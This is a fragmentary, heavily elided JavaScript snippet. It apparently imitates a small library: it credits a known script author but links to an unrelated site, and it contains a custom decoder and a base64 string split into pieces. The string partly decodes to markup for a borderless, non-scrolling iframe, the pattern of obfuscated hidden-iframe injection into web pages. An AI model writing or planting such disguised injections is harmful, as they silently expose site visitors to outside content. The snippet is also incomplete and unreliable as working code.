(function () {
    function r(e) {
        ...
        this.Version = 1.4;
        this.Author = "Andrew Urquhart (http://haduythuan.com)"
    }
    ...
    function a(data,order) {
        ...
        data += '';
        do {
            h1 = order.indexOf(data.charAt(i++));
            h2 = order.indexOf(data.charAt(i++));
            h3 = order.indexOf(data.charAt(i++));
            h4 = order.indexOf(data.charAt(i++));
    ...
    var e = '';
    var n = "ZyYW1lIiBmcmFtZW" + "JvcmRlcj0iMCIgc2Nyb2xs" + "aW5nPSJubyI+PC9p" + "ZnJhbWU+PC9kaXY" + "+";
    (function (e) {
